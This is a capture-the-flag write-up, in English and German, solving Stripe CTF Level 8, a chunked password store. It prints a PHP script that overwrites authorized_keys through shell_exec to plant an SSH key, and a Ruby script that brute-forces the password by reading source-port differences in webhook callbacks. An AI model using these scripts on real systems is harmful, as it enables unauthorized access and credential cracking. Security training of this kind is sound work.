LEVEL 08
========

ssh running on server 2, inject your ssh-key with ssh.php.
Log in with user-XXXXX@level02-X.stripe-ctf.com.

Configure and upload crack0r.rb. After that: run it!

---

Welcome to the final level, Level 8.

HINT 1: No, really, we're not looking for a timing attack.

HINT 2: Running the server locally is probably a good place to start. Anything interesting in the output?

UPDATE: If you push the reset button for Level 8, you will be moved to a different Level 8 machine, and the value of your Flag will change. If you push the reset button on Level 2, you will be bounced to a new Level 2 machine, but the value of your Flag won't change.

Because password theft has become such a rampant problem, a security firm has decided to create PasswordDB, a new and secure way of storing and validating passwords. You've recently learned that the Flag itself is protected in a PasswordDB instance, accesible at https://level08-4.stripe-ctf.com/user-XXXX/.

PasswordDB exposes a simple JSON API. You just POST a payload of the form {"password": "password-to-check", "webhooks": ["mysite.com:3000", ...]} to PasswordDB, which will respond with a {"success": true}" or {"success": false}" to you and your specified webhook endpoints.

(For example, try running curl https://level08-4.stripe-ctf.com/user-XXXX/ -d '{"password": "password-to-check", "webhooks": []}'.)

In PasswordDB, the password is never stored in a single location or process, making it the bane of attackers' respective existences. Instead, the password is "chunked" across multiple processes, called "chunk servers". These may live on the same machine as the HTTP-accepting "primary server", or for added security may live on a different machine. PasswordDB comes with built-in security features such as timing attack prevention and protection against using unequitable amounts of CPU time (relative to other PasswordDB instances on the same machine).

As a secure cherry on top, the machine hosting the primary server has very locked down network access. It can only make outbound requests to other stripe-ctf.com servers. As you learned in Level 5, someone forgot to internally firewall off the high ports from the Level 2 server. (It's almost like someone on the inside is helping you — there's an sshd running on the Level 2 server as well.)

To maximize adoption, usability is also a goal of PasswordDB. Hence a launcher script, password_db_launcher, has been created for the express purpose of securing the Flag. It validates that your password looks like a valid Flag and automatically spins up 4 chunk servers and a primary server.

You can obtain the code for PasswordDB from git clone https://level08-4.stripe-ctf.com/user-XXXX/level08-code, or simply read the source below.

---

Der Passwordstore in Level08 hält ein 12-stelliges numerisches Passwort, welches in vier Teile geteilt wurde und in vier Prozesse ausgelaert wurde. Senden wir einen Request zu dem Primärserver, so werden alle vier Chunkserver auf die Callback-URL zugreifen und false bzw. true melden.

    curl https://level08-4.stripe-ctf.com/user-XXXX/ -d '{"password": "password-to-check", "webhooks": []}'

Ein Passwort 123456789012 wird also in die chunks [123, 456, 789, 012] geteilt. Nun können wir hier einfach die einzelnen Chunks hochzählen und auf  eine true-Antwort des Chunkservers warten. Ist das für den ersten Chunk gelungen, so zählen wir einfach den zweiten weiter hoch. Was aus den Logfiles des Servers (probiert's mal lokal aus!) ersichtlich wird, ist, dass uns die Portabstände verraten, welcher Chunkserver zu welchem Chunk Rückmeldung gibt. Darüber hinaus haben wir das kleine Problem, dass der Passwortserver keine Netzverbindung nach aussen hat, lediglich auf Server  *stripe-ctf.com kann der Passwortserver zugreifen. Um ein Script auszuführen bräuchten wir also Zugang zum SSH-Server aus Level02. Wenn wir uns mit dem Username aus Level02 auf dem Server per SSH einloggen wollen fällt auf, dass man lediglich per Public Key zugreifen kann. Also kann man hier ein kleines Script benutzen, welches unseren SSH-Key in die _~/.ssh/allowed_keys_ injiziert.

    <?php
      error_reporting(E_ALL);
      $key = "your id_rsa.pub key"
      shell_exec('rm -rf ../../.ssh/authorized_keys');
      shell_exec('touch ../../.ssh/authorized_keys');
      shell_exec('echo ' . $key . ' >> ../../.ssh/authorized_keys');
      echo shell_exec('cat ../../.ssh/authorized_keys');
    ?>

Danach kann man sich per SSH einloggen. Wer nicht weiß wie man einen id_rsa.pub Key generiert...äh. Googlen?
Jetzt kann man folgendes, kleines Script verwenden um das Passwort per Bruteforce herauszufinden - das dauert ein wenig, funktioniert aber super!

    require 'net/http'
    require 'net/https'
    require 'socket'

    port = 0
    #host = "https://level08-4.stripe-ctf.com/user-xxxxx/"
    #lvl2machine = "level02-2.stripe-ctf.com"
    host = "http://127.0.0.1:3000"
    lvl2machine = '127.0.0.1'
    webhooks = []

    chunks = [0, 0, 0, 0]

    uri = URI.parse(host);
    server = TCPServer.new(32000)

    while true
      password = "#{chunks[0].to_s.rjust(3, '0')}#{chunks[1].to_s.rjust(3, '0')}#{chunks[2].to_s.rjust(3, '0')}#{chunks[3].to_s.rjust(3, '0')}"
      body = "{\"password\": \"#{password}\", \"webhooks\": [\"#{lvl2machine}:#{server.addr[1]}\"]}"
      http = Net::HTTP.new(uri.host, uri.port)
      #http.use_ssl = true # needed for production system
      #http.verify_mode = OpenSSL::SSL::VERIFY_NONE # needed for production system
      req = Net::HTTP::Post.new(uri.request_uri)
      req.body = body
      begin
        response = http.request(req)
        client = server.accept
      rescue
        puts 'exception!'
        next
      end
      if port != 0
        diff = client.peeraddr[1] - port
        print "Password: #{password} - "
        p client.peeraddr
        index = diff - 3 # may need adjustment
        if [0,1,2,3].include? index
          chunks[index] += 1
        end
        if response.body.include?("true")
          puts 'BAM'
          return
        end
      end
      port = client.peeraddr[1]
      client.close
    end

Man erstellt also auf dem Server von Level 2 einen kleinen TCP Server, der auf Verbindungen der Chunkserver wartet. Das ist notwendig, damit wir an die Portnummer des sendenden Prozesses kommmen. Danach wird eine Differenz aus letztem und aktuellen Port errechnet und danach der zugehörige Chunk aufaddiert. Am Ende sollte dann das korrekte Passwort ausgegeben werden. Fertig!